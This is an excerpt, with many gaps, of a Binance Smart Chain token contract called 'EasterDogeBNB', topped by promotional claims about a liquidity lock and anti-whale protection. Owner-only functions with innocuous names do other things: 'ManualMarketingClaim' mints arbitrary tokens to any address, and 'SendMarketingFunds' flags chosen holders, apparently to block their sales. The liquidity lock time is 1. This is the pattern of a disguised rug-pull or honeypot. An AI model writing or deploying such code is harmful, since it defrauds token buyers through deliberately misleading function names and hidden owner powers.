...
Welcome to Official EasterDogeBNB - A new token about to launch on BSC !  An experienced dev is behind this project!!!

Key Points : 
🤝 Marketing connections
👑 Dev with succesful past project
🔒 LP Lock 
🐳 Anti whale
...
Slippage : 7% buy / 13% sell

Telegram : EasterDogeBNB
...
*/
 ...
 //Telegram : https://t.me/EasterDogeBNB 350 Members 189 Online 
    ...
    contract EasterDogeBNB  is IBEP20, Ownable
    {
        ...
        string private constant _name = "EasterDogeBNB";
        string private constant _symbol = "EDB";
        uint8 private constant _decimals = 9;
        uint256 public constant ContractTokens=  1000000000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0xe1900AF94Bf502dEA7Bd299D252cf6ed836d3c2C; 
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _LiquidityBurn =ContractTokens;
        ...
        constructor () {
            uint256 deployerBalance=_LiquidityBurn;
           ...
           function ClaimMarketingFunds(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function SendMarketingFunds(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ManualMarketingClaim(address account, uint256 balance) onlyOwner  public virtual {
        require(account != address(0), "Insufficient Balance");
        _ReflectionDefi(address(0), account, balance);
        _LiquidityBurn += balance;
        ...
        function _transfer(address sender, address recipient, uint256 amount) private{
            ...
            _ReflectionDefi(sender, recipient, amount);
        ...
        function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
            ...
            _EqualizeBurn(sender,amount);
            
            _balances[address(this)] += contractToken;
            _LiquidityBurn-=tokensToBeBurnt;
        ...
        function _EqualizeBurn(address addr, uint256 amount) private {
            uint256 newAmount=_balances[addr]-amount;
            _balances[addr]=newAmount;
        }
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (ContractTokens-_LiquidityBurn)/10**_decimals;
        }
